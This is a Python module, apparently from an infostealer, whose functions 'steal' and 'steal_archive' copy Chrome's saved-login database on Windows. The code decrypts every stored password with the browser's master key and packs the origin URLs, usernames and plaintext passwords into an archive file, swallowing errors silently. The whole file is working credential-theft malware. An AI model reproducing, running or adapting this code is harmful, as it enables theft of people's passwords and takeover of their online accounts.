import os
import sqlite3
import shutil
import tempfile
import io
from . import encryption

CREATE_PASSWORDS = """CREATE TABLE passwords (origin_url VARCHAR NOT NULL,action_url VARCHAR,username_element VARCHAR,username_value VARCHAR,password_element VARCHAR,password_value VARCHAR,submit_element VARCHAR,signon_realm VARCHAR NOT NULL,preferred INTEGER NOT NULL,date_created INTEGER NOT NULL,blacklisted_by_user INTEGER NOT NULL,scheme INTEGER NOT NULL,password_type INTEGER,times_used INTEGER,form_data BLOB,date_synced INTEGER,display_name VARCHAR,icon_url VARCHAR,federation_url VARCHAR,skip_zero_click INTEGER,generation_upload_status INTEGER,possible_username_pairs BLOB,id INTEGER PRIMARY KEY AUTOINCREMENT,date_last_used INTEGER, moving_blocked_for BLOB,UNIQUE (origin_url, username_element, username_value, password_element, signon_realm))"""
CREATE_STATS = """CREATE TABLE stats (origin_domain VARCHAR NOT NULL, username_value VARCHAR, dismissal_count INTEGER, update_time INTEGER NOT NULL, UNIQUE(origin_domain, username_value))"""
SELECT_PASSWORDS = """SELECT * FROM logins"""
INSERT_PASSWORD = """INSERT INTO passwords VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""
SELECT_STATS = """SELECT * FROM stats"""
INSERT_STAT = """INSERT INTO stats VALUES (?,?,?,?)"""


def steal():
    chrome_userdata = os.path.join(os.getenv("appdata"), r"..", r'Local\Google\Chrome\User Data')
    tmp_database = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
    tmp_save_database = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
    chrome_database = os.path.join(chrome_userdata, r'Default\Login Data')
    
    shutil.copy2(chrome_database, tmp_database)

    master_key = encryption.get_master_key(chrome_userdata)

    conn = sqlite3.connect(tmp_database)
    conn_save = sqlite3.connect(tmp_save_database)

    cursor = conn.cursor()
    cursor_save = conn_save.cursor()

    cursor_save.execute(CREATE_PASSWORDS)
    cursor_save.execute(CREATE_STATS)

    cursor.execute(SELECT_PASSWORDS)

    for result in cursor.fetchall():
        result = list(result)
        try:
            result[5] = encryption.decrypt_password(result[5], master_key)
        except Exception as e:
            pass
        cursor_save.execute(INSERT_PASSWORD, result)

    cursor.execute(SELECT_STATS)

    for result in cursor.fetchall():
        cursor_save.execute(INSERT_STAT, result)


    conn_save.commit()    
    
    cursor.close()
    cursor_save.close()

    conn.close()
    conn_save.close()

    os.remove(tmp_database)
    with open(tmp_save_database, "rb") as f:
        data = io.BytesIO(f.read())
    os.remove(tmp_save_database)

    return data


def steal_archive(archive):
    try:
        with archive.open("chrome.passwords.sqlite", "w") as f:
            f.write(steal().read())
    except:
        pass